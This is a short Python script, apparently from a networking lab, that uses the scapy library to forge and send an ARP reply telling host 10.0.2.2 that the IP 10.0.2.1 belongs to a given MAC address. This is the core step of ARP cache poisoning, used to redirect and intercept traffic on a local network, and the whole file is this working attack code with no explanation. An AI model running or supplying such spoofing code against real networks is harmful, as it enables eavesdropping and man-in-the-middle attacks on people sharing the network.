import scapy.all as scapy

arpResponse = scapy.ARP(op=2,pdst="10.0.2.2", hwdst="52:54:00:12:35:00", psrc="10.0.2.1")
scapy.send(arpResponse)
#scapy.ls(scapy.ARP())

